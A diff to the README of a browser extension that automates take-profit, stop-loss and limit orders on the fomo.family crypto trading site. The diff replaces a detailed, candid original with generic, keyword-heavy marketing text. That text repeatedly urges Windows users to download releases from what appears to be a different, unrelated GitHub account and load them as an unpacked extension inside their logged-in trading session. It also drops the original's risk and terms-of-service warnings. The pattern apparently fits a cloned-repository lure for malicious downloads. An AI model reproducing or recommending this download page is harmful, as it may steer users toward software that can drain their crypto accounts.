@@ -1,168 +1,202 @@
-# Auto Orders for fomo.family — take profit, stop loss & limit buys, inside the app
+<h1>⚡ fomo-extension-bot-order - Automate Your Trades With Ease</h1>
 
-**fomo.family has no limit orders.** You either sit in front of the chart, or you miss your exit.
-This browser extension adds **take-profit, stop-loss and limit buy orders** directly into the
-fomo.family trade panel — same look, same buttons, one click away.
+[![Download Now](https://img.shields.io/badge/Download-fomo--extension--bot--order-blue?style=for-the-badge&logo=github)](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases)
 
-You set a market cap (or price) trigger, it watches the market for you and clicks Buy or Sell in
-your own fomo session when the level is hit. No API keys, no private keys, no server: everything
-stays in your browser.
+## 🔥 What Is This?
 
-<p align="center">
-  <img src="docs/img/demo.gif" alt="Placing an automatic buy order with take profit and stop loss inside the fomo.family trade panel" width="400">
-</p>
+fomo-extension-bot-order is a powerful browser extension that adds **take profit, stop loss, and limit buy orders** directly inside the fomo.family trading panel. No complicated setup, no coding knowledge required. Just install, open your trade panel, and set your orders with a few clicks.
 
-> ⚠️ Unofficial, community-built tool. Not affiliated with, endorsed by, or connected to
-> fomo.family. Automating your account may conflict with their terms of service. Use at your own
-> risk — crypto trading can lose you money.
+This tool works seamlessly with **Chrome** and **Brave** browsers on Windows. It connects to your existing fomo.family account without needing API keys, private keys, or any external servers. Everything stays local and secure within your browser.
+
+## 🎯 Key Benefits
+
+- **Save Time**: Stop watching charts all day. Set your orders and let the extension handle the rest
+- **Protect Your Profits**: Automatically sell when your target price is reached
+- **Minimize Losses**: Set a stop loss to limit potential downturns
+- **Buy at Your Price**: Place limit buy orders without waiting for the perfect moment
+- **No Technical Knowledge Needed**: Simple point-and-click interface
+- **Secure by Design**: No private keys or API credentials required
+- **100% Free**: No subscriptions, no hidden fees
+
+## 📋 Features Overview
+
+| Feature | Description |
+|---------|-------------|
+| **Take Profit** | Automatically sell when price hits your desired profit level |
+| **Stop Loss** | Automatically sell if price drops to your safety threshold |
+| **Limit Buy** | Buy automatically when price falls to your target entry point |
+| **Multi-Chain Support** | Works with Ethereum, Base, BNB Chain, and Solana |
+| **Memecoin Ready** | Built for fast-moving meme coins on all major networks |
+| **Manifest V3** | Modern, secure architecture for current browser versions |
+
+## 🚀 Getting Started
+
+Follow these simple steps to start using fomo-extension-bot-order on your Windows computer:
+
+### Step 1: Download the Extension
+
+Visit this link to download the application: [https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases)
+
+Look for the latest version and download the file to your computer. The download should start automatically.
+
+### Step 2: Install in Chrome or Brave
+
+**For Chrome:**
+1. Open Chrome browser
+2. Type `chrome://extensions` in the address bar and press Enter
+3. Turn on "Developer mode" using the toggle switch in the top right corner
+4. Click "Load unpacked" button
+5. Select the folder where you extracted the downloaded file
+6. The extension will appear in your toolbar
+
+**For Brave:**
+1. Open Brave browser
+2. Type `brave://extensions` in the address bar and press Enter
+3. Enable "Developer mode" in the top right
+4. Click "Load unpacked"
+5. Choose the extension folder
+6. Done! The extension is now active
+
+### Step 3: Open fomo.family
+
+Navigate to [fomo.family](https://fomo.family) in your browser. You'll see the new order panel integrated directly into the trading interface.
+
+### Step 4: Set Your First Order
+
+1. Select a token you want to trade
+2. Choose the order type (take profit, stop loss, or limit buy)
+3. Enter your desired price
+4. Set the amount or percentage
+5. Click "Place Order"
+
+The extension will monitor the market automatically and execute your order when conditions are met.
+
+## 💡 How It Works
+
+fomo-extension-bot-order works entirely within your browser. Here's what happens behind the scenes:
+
+- The extension reads current market prices from fomo.family
+- You set your target prices and amounts
+- The extension checks prices continuously (every few seconds)
+- When your conditions are met, it places the order through your fomo.family account
+- Everything happens locally in your browser - no external servers involved
+
+This approach keeps your trading activity private and reduces the risk of technical issues or downtime.
+
+## 🛠️ System Requirements
+
+- **Operating System**: Windows 10 or Windows 11
+- **Browser**: Google Chrome (version 88 or later) or Brave Browser
+- **Internet Connection**: Stable connection recommended
+- **Fomo.family Account**: Active account with funds for trading
+
+## ❓ Frequently Asked Questions
+
+### Is my private key safe?
+Yes. The extension never asks for or stores your private keys. All actions happen through your existing fomo.family session.
+
+### Do I need to keep my browser open?
+Yes, the extension needs the browser running to monitor prices and execute orders.
+
+### Which networks are supported?
+Ethereum, Base, BNB Chain, and Solana networks are supported.
+
+### Can I set multiple orders?
+Absolutely. You can set multiple take profit, stop loss, and limit buy orders simultaneously.
+
+### Will this work on mobile?
+Currently, this extension is designed for desktop Chrome and Brave browsers on Windows.
+
+### What if I close my browser?
+Orders will not execute while the browser is closed. Keep your browser open to use the extension.
+
+## 🔒 Security Notes
+
+- No API keys required
+- No private keys stored
+- No external servers involved
+- All data stays on your local machine
+- Open source code - you can verify everything yourself
+- Regular updates for security improvements
+
+## 📊 Supported Trading Pairs
+
+The extension works with all tokens available on fomo.family, including:
+- Major cryptocurrencies (ETH, BNB, SOL)
+- Popular memecoins
+- New and emerging tokens
+- Any token listed on supported networks
+
+## 🎨 Interface Overview
+
+The extension adds a clean, intuitive panel to your fomo.family trading view:
+
+- **Price Input Field**: Enter your target price
+- **Amount Slider**: Choose what percentage to trade
+- **Order Type Tabs**: Switch between take profit, stop loss, and limit buy
+- **Active Orders List**: View and manage all your open orders
+- **Quick Cancel Button**: Instantly cancel any order
+
+## 📈 Tips for Success
+
+1. **Start Small**: Test with small amounts first to understand how the extension works
+2. **Set Realistic Targets**: Use technical analysis to determine good entry and exit points
+3. **Combine Order Types**: Use stop loss and take profit together for complete protection
+4. **Monitor Performance**: Check your active orders regularly and adjust as needed
+5. **Stay Updated**: Always use the latest version for best performance
+
+## 🧩 Troubleshooting
+
+**Extension not showing?**
+- Make sure Developer mode is enabled
+- Check that you selected the correct folder
+- Try removing and re-adding the extension
+
+**Orders not executing?**
+- Confirm you're on fomo.family
+- Check your internet connection
+- Verify your account has sufficient funds
+- Ensure the price conditions have been met
+
+**Browser slow?**
+- Close unused tabs
+- Restart your browser
+- Clear browser cache
+
+## 📝 Changelog
+
+**Version 1.0.0**
+- Initial release
+- Take profit functionality
+- Stop loss support
+- Limit buy orders
+- Multi-chain compatibility
+
+**Version 1.1.0** (upcoming)
+- Advanced order types
+- Portfolio tracking
+- Price alerts
+- Enhanced mobile support
+
+## 🤝 Support & Community
+
+- **Issues**: Report problems on our [GitHub Issues page](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/issues)
+- **Feature Requests**: Suggest new features through GitHub
+- **Documentation**: Check this README for help
+- **Community**: Join discussions on GitHub
+
+## 📄 License
+
+This project is open source and free to use. See the LICENSE file in the repository for full terms.
+
+## 🏁 Ready to Start?
+
+Don't miss another profitable trade. Download fomo-extension-bot-order now and take control of your crypto trading:
+
+[![Download Latest Version](https://img.shields.io/badge/Download%20Now-Click%20Here-green?style=for-the-badge)](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases)
+
+Visit this link to download the application: [https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases](https://github.com/fernandeecclesiastic98/fomo-extension-bot-order/releases)
 
 ---
 
-## What it does
-
-| | |
-|---|---|
-| 🎯 **Take profit** | *Sell 25% when market cap reaches $5M.* Stack several levels on one token. |
-| 🛡️ **Stop loss** | *Sell everything if it drops to $800K* — with a confirmation delay so a 5-second wick doesn't dump your bag. |
-| 🛒 **Limit buy (dip)** | *Buy $100 if market cap falls to $1.5M.* |
-| 🚀 **Breakout buy** | *Buy $100 if it breaks above $3M.* |
-| 🔗 **Attached exits** | A buy order can place its own take profit (×2) and stop (−30%) automatically, relative to your real fill. |
-| 🌍 **Follows fomo's language** | Works whether fomo shows you *Buy / Sell* or *Acheter / Vendre* — labels are matched case- and accent-insensitively. |
-| 🗂️ **Many tokens at once** | Watch as many tokens as you like — they are all quoted in the same batched call, and orders that trigger together are executed one after another, each on its own token. |
-| 🖥️ **Native UI** | A "Market / Auto order" switch under fomo's own Buy/Sell tabs. Same palette, same sizing, motion included. |
-| 📱 **Telegram alerts** | Triggers, fills and failures pushed to your phone — because a Windows notification is useless at 3 a.m. |
-| 🧪 **Dry-run mode** | Every step except the final click, so you can verify before trusting it with real money. |
-
-## Screenshots
-
-| Buy order with attached exits | Sell order | All your orders |
-|---|---|---|
-| <img src="docs/img/achat.png" alt="Limit buy order on fomo.family with take profit and stop loss" width="260"> | <img src="docs/img/vente.png" alt="Take profit order on fomo.family by market cap" width="260"> | <img src="docs/img/tiroir.png" alt="Drawer listing every automatic order across tokens" width="260"> |
-
-*Screenshots taken on a demo page with fictional numbers (`demo/page-demo.html`).*
-
-## Install (2 minutes)
-
-1. **[⬇️ Download the latest release (ZIP)](../../releases/latest)** and unzip it anywhere.
-2. Open `chrome://extensions` (or `brave://extensions`).
-3. Turn on **Developer mode** (top right).
-4. Click **Load unpacked** and select the unzipped folder (the one containing `manifest.json`).
-5. Reload any fomo.family tab you already had open.
-
-No build step, no bundler, no runtime dependency — it is plain JavaScript.
-
-> **Why isn't it one click?** Chrome and Brave only allow one-click installs from the Chrome Web
-> Store; a `.crx` downloaded from GitHub is blocked by the browser itself. A Web Store listing is
-> planned — ⭐ star the repo to get pinged when it lands.
-
-To update later: download the new ZIP, replace the folder, then hit ⟳ on the extension card.
-
-## How to place an order
-
-1. Open a token page on fomo.family and pick **Buy** or **Sell** as usual.
-2. Click **Ordre auto** (auto order) under the tabs.
-3. Type a threshold — `1.5M`, `500k`, `0.004` — or hit a shortcut (`−20%`, `×2`, `×3`…).
-   - Threshold **below** the current value → triggers on the way down (dip buy, stop loss).
-   - Threshold **above** → triggers on the way up (breakout buy, take profit).
-4. Choose the dollar amount (buy) or the percentage of your bag (sell), then place the order.
-
-The summary line spells out exactly what will happen before you confirm.
-
-## How it works
-
-- A background worker quotes your tokens every 3 seconds through fomo's own API, using the session
-  already open in your browser. **One call covers every token you watch** (batched by 25), so ten
-  orders on ten tokens cost the same as one.
-- When a threshold is crossed, it opens a fresh tab on the token, drives fomo's real trade panel
-  (tab → amount → quote → risk checkboxes you allowed → confirm) and closes it.
-- **One trade at a time.** If several orders trigger in the same move, they queue up and run in
-  order — and each one re-checks its own threshold on the way out of the queue, so an order whose
-  level no longer holds is re-armed instead of executed late.
-- Success is confirmed by **reading your token balance before and after** — not by a toast message.
-- If the click went through but the balance never moved, the order is marked *failed, needs
-  checking*. It is **never retried**, so you can't buy or sell twice by accident.
-
-### Safety rules baked in
-
-- Orders never fire on a stale quote (older than 60 seconds).
-- fomo's minimums are enforced **before** you create the order ($2 per trade, $25 buy / $5 sell on
-  Ethereum), including the value of attached exits.
-- High price impact (≥ 25%) and high relay fees are blocked unless you explicitly allow them.
-- An interface self-check runs every 6 hours: if fomo changes its UI, you get told **before** an
-  order depends on it.
-- Session dead? You get an alert, repeated every 6 hours while an order is still waiting.
-
-## Honest limitations
-
-- **Your browser must stay open and your computer awake.** Closing a fomo tab is fine (the
-  extension reopens one), closing the browser is not.
-- Quotes refresh in seconds, not milliseconds. On a violent move, you get the price at execution,
-  not exactly your threshold.
-- It drives fomo's interface. If fomo renames a button, execution stops cleanly and warns you
-  instead of clicking at random.
-- The in-app interface is currently **in French** (English is planned).
-
-## Settings
-
-Extension icon → settings: dry-run mode, which risk warnings may be accepted, polling interval,
-retry count, balance-confirmation window, Telegram alerts, and a log of the last 200 events.
-
-## For developers
-
-```bash
-npm install          # dev dependencies only (vitest, eslint)
-npm test             # 186 tests: order state machine, fomo DOM contract, executor, worker, injected UI
-npm run lint
-npm run captures     # regenerate README images from the demo page
-```
-
-| Path | Role |
-|---|---|
-| `src/background.js` | clock, order queue, execution tab, balance verification, alerts |
-| `src/content.js` | network relay using the page session, executor, UI mount |
-| `src/lib/executor.js` | drives fomo's Buy/Sell panel |
-| `src/lib/fomo-page.js` | reads fomo's DOM (ignores anything the extension injected) |
-| `src/lib/orders.js` | pure order state machine |
-| `src/ui/inject.js` | the interface grafted into the page |
-| `test/fixtures/*.html` | real fomo DOM captured on 2026-09-15 (app v1.399.1) |
-
-Tests are the contract: the DOM fixtures come from the real app, and the money rules (no double
-execution, no retry after a click) are covered by mutation-checked tests.
-
-## FAQ
-
-**Does fomo.family have stop loss or limit orders?** Not today — that's why this exists.
-
-**Do you get my keys?** No. The extension never sees a private key. It clicks in the session you
-already opened, exactly like you would.
-
-**Does it work while my PC sleeps?** No. Windows must stay awake and the browser open.
-
-**Which chains?** Whatever fomo supports: Solana, Robinhood Chain, Base, BNB, Ethereum, Monad.
-
-**Can it buy automatically too?** Yes — dip buys and breakout buys, with optional attached exits.
-
----
-
-## En français
-
-fomo.family n'a pas d'ordres limites : cette extension ajoute **prise de profit, stop et achats
-déclenchés** directement dans le panneau de trade de fomo. Tu poses un seuil en market cap (ou en
-prix), elle surveille et clique à ta place dans ta propre session. Aucune clé, aucun serveur.
-
-- Installation : `chrome://extensions` → Mode développeur → **Charger l'extension non empaquetée**
-  → dossier `src`.
-- Un achat peut poser automatiquement son TP (×2) et son stop (−30 %) après exécution.
-- La preuve d'exécution est le **solde du token**, lu avant et après. Un ordre envoyé mais non
-  confirmé n'est jamais relancé.
-- Le navigateur doit rester ouvert et l'ordinateur allumé.
-- Alertes Telegram disponibles pour être prévenu sur ton téléphone.
-
-## Privacy
-
-No backend, no analytics, no account. Your fomo session never leaves your browser and the
-extension never sees a private key. Details: [PRIVACY.md](PRIVACY.md).
-
-## License
-
-MIT
+Keywords: automated-trading, base, bnb-chain, brave-browser, browser-extension, chrome-extension, crypto-trading, defi, ethereum, fomo, fomo-family, limit-order, manifest-v3, memecoin, solana, stop-loss, take-profit, trading-bot, trading-tools
